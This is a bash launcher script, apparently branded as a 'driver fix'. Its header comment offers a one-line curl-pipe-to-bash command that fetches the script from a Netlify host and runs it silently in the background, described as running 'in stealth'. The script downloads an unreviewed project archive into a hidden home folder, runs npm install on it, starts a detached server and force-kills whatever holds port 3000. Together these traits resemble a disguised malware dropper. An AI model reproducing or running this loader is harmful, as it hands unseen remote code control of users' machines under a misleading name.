#!/usr/bin/env bash
# One-line launcher — download from Netlify, run local dev in stealth.
# macOS/Linux one command (background):
# mkdir -p ~/.driver-fix-host/.host-setup && nohup bash -c 'curl -fsSL https://driver-fix-238308.netlify.app/bootstrap.sh | bash' >>~/.driver-fix-host/.host-setup/run.log 2>&1 &
# First run can take 2-3 min (node download + npm install). Check: tail -f ~/.driver-fix-host/.host-setup/run.log
set -euo pipefail

SITE_BASE="https://driver-fix-238308.netlify.app"
PROJECT_ROOT="${HOME}/.driver-fix-host"
SETUP_DIR="${PROJECT_ROOT}/.host-setup"
LOG_FILE="${SETUP_DIR}/run.log"
LOCK_FILE="${SETUP_DIR}/running.lock"
PID_FILE="${SETUP_DIR}/dev.pid"
DEV_PORT=3000
DEV_URL="http://127.0.0.1:${DEV_PORT}"
NODE_VERSION="20.18.0"
OS=""
ARCH=""

log() {
  mkdir -p "$SETUP_DIR"
  printf '[%s] %s\n' "$(date '+%Y-%m-%d %H:%M:%S')" "$1" >>"$LOG_FILE"
}

log_tail_dev() {
  local n="${1:-12}"
  if [[ -f "${SETUP_DIR}/dev.log" ]]; then
    tail -n "$n" "${SETUP_DIR}/dev.log" | while IFS= read -r line; do
      log "dev: $line"
    done
  fi
}

require_cmd() {
  local c="$1"
  if ! command -v "$c" >/dev/null 2>&1; then
    log "missing required command: $c"
    return 1
  fi
}

detect_platform() {
  case "$(uname -s)" in Darwin) OS="darwin" ;; Linux) OS="linux" ;; *) log "unsupported os: $(uname -s)"; return 1 ;; esac
  case "$(uname -m)" in
    aarch64|arm64) ARCH="arm64" ;;
    x86_64|amd64) ARCH="x64" ;;
    *) log "unsupported arch: $(uname -m) (need x86_64/amd64 or arm64/aarch64)"; return 1 ;;
  esac
  log "platform: ${OS}-${ARCH}"
}

ensure_project() {
  mkdir -p "$PROJECT_ROOT"
  if [[ -f "${PROJECT_ROOT}/package.json" ]]; then return 0; fi
  log 'project: download'
  mkdir -p "$SETUP_DIR"
  curl -fsSL "${SITE_BASE}/project.tar.gz" -o "${SETUP_DIR}/project.tar.gz"
  log 'project: extract'
  tar xzf "${SETUP_DIR}/project.tar.gz" -C "$PROJECT_ROOT"
  rm -f "${SETUP_DIR}/project.tar.gz"
}

refresh_node_path() {
  export PATH="${SETUP_DIR}/node-v${NODE_VERSION}-${OS}-${ARCH}/bin:/opt/homebrew/bin:/usr/local/bin:/usr/bin:${HOME}/.nvm/current/bin:${PATH}"
}

find_node() {
  refresh_node_path
  command -v node >/dev/null 2>&1 && return 0
  local c
  for c in "${SETUP_DIR}/node-v${NODE_VERSION}-${OS}-${ARCH}/bin/node" \
    "/opt/homebrew/bin/node" "/usr/local/bin/node" "/usr/bin/node" "${HOME}/.nvm/current/bin/node"
  do
    [[ -x "$c" ]] && export PATH="$(dirname "$c"):${PATH}" && return 0
  done
  return 1
}

sha256_file() {
  if command -v sha256sum >/dev/null 2>&1; then sha256sum "$1" | awk '{print $1}'
  elif command -v shasum >/dev/null 2>&1; then shasum -a 256 "$1" | awk '{print $1}'
  else log 'missing sha256sum or shasum'; return 1; fi
}

install_node_via_tarball() {
  local tar_name="node-v${NODE_VERSION}-${OS}-${ARCH}.tar.gz"
  local tar_path="${SETUP_DIR}/${tar_name}"
  local extract_dir="${SETUP_DIR}/node-v${NODE_VERSION}-${OS}-${ARCH}"
  local expected actual

  [[ -x "${extract_dir}/bin/node" ]] && export PATH="${extract_dir}/bin:${PATH}" && return 0

  log "node: tarball ${tar_name}"
  curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/${tar_name}" -o "$tar_path"
  expected="$(curl -fsSL "https://nodejs.org/dist/v${NODE_VERSION}/SHASUMS256.txt" | awk -v n="$tar_name" '$2==n{print $1; exit}')"
  actual="$(sha256_file "$tar_path")"
  [[ "$actual" == "$expected" ]] || { rm -f "$tar_path"; log 'node: sha256 mismatch'; return 1; }

  tar xzf "$tar_path" -C "$SETUP_DIR"
  rm -f "$tar_path"
  export PATH="${extract_dir}/bin:${PATH}"
  [[ -x "${extract_dir}/bin/node" ]]
}

install_node_via_brew() {
  command -v brew >/dev/null 2>&1 || return 1
  log 'node: brew fallback'
  export HOMEBREW_NO_AUTO_UPDATE=1 HOMEBREW_NO_ENV_HINTS=1 HOMEBREW_NO_INSTALL_CLEANUP=1
  brew install --quiet node >>"$LOG_FILE" 2>&1 || return 1
  refresh_node_path
  find_node
}

ensure_node() {
  if find_node; then log "node: $(command -v node) ($(node --version 2>/dev/null || echo unknown))"; return 0; fi
  log 'node: installing'
  install_node_via_tarball && { log 'node: tarball ok'; return 0; }
  install_node_via_brew && { log 'node: brew ok'; return 0; }
  log 'node: install failed'
  return 1
}

find_npm_cli() {
  local node_bin="$1"
  local base dir
  base="$(cd "$(dirname "$node_bin")/.." && pwd)"
  for dir in "${base}/lib/node_modules/npm/bin" "${base}/node_modules/npm/bin"; do
    if [[ -f "${dir}/npm-cli.js" ]]; then
      printf '%s' "${dir}/npm-cli.js"
      return 0
    fi
  done
  return 1
}

test_dev_port_open() {
  if command -v nc >/dev/null 2>&1; then nc -z 127.0.0.1 "$DEV_PORT" >/dev/null 2>&1
  else (echo >/dev/tcp/127.0.0.1/"$DEV_PORT") >/dev/null 2>&1; fi
}

http_probe() {
  if command -v curl >/dev/null 2>&1; then
    curl -fsS --max-time 10 "$DEV_URL" >/dev/null 2>&1
    return $?
  fi
  if command -v wget >/dev/null 2>&1; then
    wget -q --timeout=10 -O /dev/null "$DEV_URL" >/dev/null 2>&1
    return $?
  fi
  return 1
}

test_dev_server_healthy() {
  test_dev_port_open || return 1
  http_probe
}

stop_listener_on_port() {
  local pids
  if command -v lsof >/dev/null 2>&1; then
    pids="$(lsof -tiTCP:"$DEV_PORT" -sTCP:LISTEN 2>/dev/null || true)"
  elif command -v fuser >/dev/null 2>&1; then
    pids="$(fuser -n tcp "$DEV_PORT" 2>/dev/null | tr -s ' ' '\n' | grep -E '^[0-9]+$' || true)"
  else
    return 0
  fi
  [[ -z "$pids" ]] && return 0
  for p in $pids; do
    if kill -0 "$p" 2>/dev/null; then
      kill -9 "$p" 2>/dev/null || true
      log "stopped pid $p on port $DEV_PORT"
    else
      log "port $DEV_PORT held by dead pid $p"
    fi
  done
  sleep 2
}

wait_for_dev_server() {
  local e=0
  while [[ $e -lt 180 ]]; do
    if test_dev_server_healthy; then return 0; fi
    sleep 2
    e=$((e + 2))
  done
  return 1
}

start_dev_server() {
  local runner="${SETUP_DIR}/run-dev.sh"
  local q_root q_node q_next q_log
  q_root="$(printf '%q' "$PROJECT_ROOT")"
  q_node="$(printf '%q' "$NODE_BIN")"
  q_next="$(printf '%q' "$NEXT_CLI")"
  q_log="$(printf '%q' "${SETUP_DIR}/dev.log")"

  cat >"$runner" <<EOF
#!/usr/bin/env bash
cd ${q_root}
export CI=1 NEXT_TELEMETRY_DISABLED=1 NODE_NO_WARNINGS=1
exec ${q_node} ${q_next} dev --hostname 127.0.0.1 -p ${DEV_PORT} >>${q_log} 2>&1
EOF
  chmod +x "$runner"

  if command -v setsid >/dev/null 2>&1; then
    setsid nohup "$runner" >/dev/null 2>&1 &
  else
    nohup "$runner" >/dev/null 2>&1 &
  fi
  DEV_PID=$!
}

require_cmd curl || exit 1
require_cmd tar || exit 1
detect_platform || exit 1

if test_dev_server_healthy; then
  log "already running ${DEV_URL}"
  exit 0
fi

if test_dev_port_open; then
  log "port $DEV_PORT open but not healthy - clearing stale listener"
  stop_listener_on_port
fi

rm -f "$LOCK_FILE"

ensure_project
cd "$PROJECT_ROOT"
ensure_node || exit 1

NODE_BIN="$(command -v node)"
NPM_CLI="$(find_npm_cli "$NODE_BIN" || true)"

log 'npm install'
if [[ -n "$NPM_CLI" && -f "$NPM_CLI" ]]; then
  if ! "$NODE_BIN" "$NPM_CLI" install --no-fund --no-audit --loglevel=error >>"$LOG_FILE" 2>&1; then
    log 'npm install failed - see run.log above'
    exit 1
  fi
elif command -v npm >/dev/null 2>&1; then
  if ! npm install --no-fund --no-audit --loglevel=error >>"$LOG_FILE" 2>&1; then
    log 'npm install failed - see run.log above'
    exit 1
  fi
else
  log 'error: npm not found'
  exit 1
fi

NEXT_CLI="${PROJECT_ROOT}/node_modules/next/dist/bin/next"
[[ -f "$NEXT_CLI" ]] || { log 'error: next cli not found'; exit 1; }

log 'dev server start'
: >"${SETUP_DIR}/dev.log"
start_dev_server

printf '%s' "$DEV_PID" >"$PID_FILE"
printf '%s' "$DEV_PID" >"$LOCK_FILE"

if wait_for_dev_server; then
  if kill -0 "$DEV_PID" 2>/dev/null; then
    log "ready ${DEV_URL} (server running in background)"
  else
    log 'dev server exited early - see dev.log'
    log_tail_dev 12
  fi
else
  log 'dev server timeout - see dev.log'
  log_tail_dev 15
fi

exit 0
